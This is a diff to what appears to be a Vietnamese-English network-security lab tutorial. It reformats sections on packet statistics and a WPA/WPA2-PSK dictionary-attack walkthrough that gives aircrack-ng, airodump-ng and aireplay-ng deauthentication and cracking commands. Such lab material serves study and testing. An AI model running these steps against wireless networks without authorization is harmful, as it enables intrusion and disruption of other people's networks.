@@ -23,7 +23,7 @@ Statistics about packet types and data rates:
 
 ![523b7af6be0a09be4.png](https://www.upsieutoc.com/images/2020/06/14/523b7af6be0a09be4.png)
 #### **c) Latest IP Connections (IP Statistics)**
-Trang này dùng để hiển thịthông tin chi tiết về những kết nối mạng của máy tính của bạn.
+Trang này dùng để hiển thị thông tin chi tiết về những kết nối mạng của máy tính của bạn.
 * Local IP – hiển thị địa chỉ IP local. : Tùy gói tin inbound / outbound packets.
 * Remote IP – giống như Local IP nhưng ngược lại.
 * In, Out –Hiển thị số gói tin đã nhận được / gửi đi.
@@ -81,8 +81,9 @@ Statistics about Wi-Fi:
 ![13.png](https://www.upsieutoc.com/images/2020/06/14/13.png)
 
 Packet Graphs:
-
+<p align="center">
 ![14.png](https://www.upsieutoc.com/images/2020/06/14/14.png)
+</p>
 
 ## **III. CRACKING WPA/WPA2-PSK WITH A DICTIONARY ATTACK**
 ### **1. Methodology**: Dictionary attack.
@@ -98,19 +99,28 @@ Packet Graphs:
 
 ### **4. Details of steps**:
 #### **Step 1 - Start the wireless interface in monitor mode**
-* airmon-ng
-* airmon-ng start wlan0
-* iwconfig
+```
+airmon-ng
+airmon-ng start wlan0
+iwconfig
+```
 #### **Step 2 - Start airodump-ng to collect authentication handshake**
-* airodump-ng wlan0mon ⇒ Xac dinh channel
-* iwconfig wlan0mon channel 11 ⇒ Xac dinh 1 client dang ket noi toi AP.
-* airodump-ng -c 11 --bssid <MAC_AP> -w psk wlan0mon ... ⇒ Set up 1 client connect AP !!
+```
+airodump-ng wlan0mon ⇒ Xac dinh channel
+iwconfig wlan0mon channel 11 ⇒ Xac dinh 1 client dang ket noi toi AP.
+airodump-ng -c 11 --bssid <MAC_AP> -w psk wlan0mon ... ⇒ Then set up 1 client connect AP !!
+```
 #### **Step 3 - Use aireplay-ng to deauthenticate the wireless client**
-* aireplay-ng -0 1 -a <MAC_AP> -c <Client_AP> ath0
+```
+aireplay-ng -0 1 -a <MAC_AP> -c <Client_AP> ath0`
+```
 #### **Step 4 -Run aircrack-ng to crack the pre-shared key**
-* aircrack-ng -w password.lst -b <MAC_AP> psk*.cap
+```
+aircrack-ng -w password.lst -b <MAC_AP> psk*.cap
+```
 ### **5. Reference**
 Demo is available on Youtube:
+
 [![](https://www.upsieutoc.com/images/2020/06/14/image11e433a1ce5fac76.png)](https://youtu.be/lyvsETiD1WM)
 
 -----------------------------------------------------------------
